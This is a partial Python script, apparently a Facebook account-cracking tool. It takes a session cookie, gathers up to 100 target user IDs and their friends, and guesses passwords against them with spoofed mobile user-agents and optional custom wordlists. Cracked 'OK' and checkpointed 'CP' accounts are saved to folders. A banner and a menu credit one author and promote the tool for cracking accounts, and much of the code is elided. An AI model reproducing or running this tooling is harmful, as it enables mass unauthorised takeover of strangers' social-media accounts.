...
for xd in range(10000):
	...
	c=random.choice(['M2010J19CG Build/SKQ1.211202.001; wv)'])
	...
	l='Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]'
...
for x in range(10):
	...
	i='M2010J19CG Build/SKQ1.211202.001; wv)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]'
...
│01██╗██╗10110███╗100███╗10█████╗10███╗100██╗00│
│10██║██║10001████╗█████║0██╔══██╗1████╗01██║10│
│10██║██║01010██╔████ ██║0███████║0██╔██╗0██║11│
│01██║██║10010██║ ██╔╝██║1██╔══██║0██║╚██1██║00│
│11██║███████╗██║10010██║1██║10██║1██║1╚████║01│
...
def login_lagi334():
	try:
		cetak(nel('IT IS RECOMMENDED TO USE A FRESH COOKIE TO CRACK ACCOUNTS',width=90,style=f"bold purple"))
		your_cookies = input(' [+] INPUT YOUR COOKIES : ')
				...
				if 'HOW TO LOG IN YOUR FACEBOOK?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] LOGIN SUCCESFULLY | python run.py");exit()
			except Exception as e:
				print(" [+] YOUR COOKIES INVALID")
...
def menu(my_name,my_id):
	...
	cetak(nel('YOUR ID : '+str(my_id)))
	print(f'╭──────────────────────────╮')
	print(f'│ YOUR IP : {ip} │')
	print(f'╰──────────────────────────╯')
	au='[01] PUBLIC FACEBOOK\n[02] PUBLIC RESULT FACEBOOK\n[03] LOGOUT/DELETE COOKIES'                                             
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='[purple]METHODE'))
	print('╭─────────────╮')
	Ilman = input('\r│ [?] SELECT  │ : ')
	print('╰─────────────╯')
	if Ilman in ['1']:
		dump_massal()
	elif Ilman in ['2']:
		...
		print('[!] SUCCES LOGOUT/DELETE COOKIES [!]')
		exit()
	else:
		print('[X] SELECT THATS TRUE [X]')
		back()
def error():
	jalan(f'{sir}[!] WAIT THE MINUTE YOU WILL BE REDIRECTED A FACEBOOK [!]{x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/IImanramdhanirahman")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	au='[01] YOUR OK RESULT\n[02] YOUR CP RESULT\n[03] BACK'                                             
	pengembang1=nel(au,style="cyan")
	...
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('[!] YOU ARE NOT HAVE A RESULT CP [!]')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	...
	try:
		...
		print('╭────────────────────────────╮')
		jum = int(input('│[?] CHOOSE HOW MANY TARGETS │ : '))
		print('╰────────────────────────────╯')
	except ValueError:
		print('[X] ENTER NUMBERS, NOT LETTERS [X]')
		exit()
	if jum<1 or jum>100:
		print('[X] FAILED TO CHECK ID [X]')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		print('╭────────────────────╮')
		kl = input(f'│[+] ENTER ID TARGET │ '+str(yz)+ ' : ')
		print('╰────────────────────╯')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('[X] NETWORK ERROR, TRY AGAIN [X]')
			exit()
	try:
		print(f'╭────────────────────╮')
		print(f'│[+] TOTAL ID RESULT │ : '+str(len(id)))
		print(f'╰────────────────────╯')
		setting()
	except requests.exceptions.ConnectionError:
		print('[X] NETWORK ERROR, TRY AGAIN [X]')
		...
		print(f'[X]{k} TEMAN IS NOT A PUBLIC [X]{x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-ID ]---------------#
def setting():
	au='[01] ACCOUNT ID OLD\n[02] ACCOUNT ID NEW\n[03] ACCOUNT ID RANDOM'
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='[purple]METHODE'))
	print('╭───────────╮')
	hu = input('│[?] SELECT │ : ')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('╭────────────────────────╮')
	_ilman_ = input('│[Y/T] SHOW RELATED APPS │ : ')
	print('╰────────────────────────╯')
	if _ilman_ in ['']:
		print('[X] SELECT THATS TRUE [X]')
		back()
		...
		taplikasi.append('no')
	print('╭─────────────────────────────────╮')
	pwplus=input('│[Y/T] SHOW ADD PASSWORD MANUALLY │ : ')
	print('╰─────────────────────────────────╯')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		au='[!] EXAMPLE : idonesia, bandung, majalengka. [!]'
		pengembang1=nel(au,style="cyan")
		cetak(nel(pengembang1, title='[purple][!] INPUT PASSWORD MANUALLY [!]'))
		print('╭───────────────────────────╮')
		pwku=input('│[?] ADD PASSWORD MANUALLY  │ : ')
		print('╰───────────────────────────╯')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	au='[!] PROCESS IS RUNNING PLEASE WAIT [!]'
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='[purple][!] ATTENTION WARNING [!]'))
	print('╭────────────────────────────────────────────────────────────────╮')
	print(f'│[!] RESULT OK WILL SAVE IN FOLDER : OK/%s  │'%(okc))
	print(f'│[!] RESULT CP WILL SAVE IN FOLDER : CP/%s  │'%(cpc))
	print('╰────────────────────────────────────────────────────────────────╯')
	au='[!] IF THERE IS NO RESULT IN 500 ID PLAY AIRPLANE EVERY 10 SECOND [!]'
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='[purple][!] ATTENTION WARNING [!]'))
	...
	cetak(nel(pengembang1, title='[purple][!] ATTENTION WARNING [!]'))
	print('╭────────────────────────────╮')
	print(f'│[!] RESULT ACCOUNT OK : %s   │'%(ok))
	print(f'│[!] RESULT ACCOUNT CP : %s   │'%(cp))
	print('╰────────────────────────────╯')
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r ILMAN >_ {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	ilman(f'\n\t {h}HALLO THIS IS SCRIPT ILMAN RAMDHANI RAHMAN, ENJOY USE THIS SCRIPT :>{x} ')
	time.sleep(3)
	login()
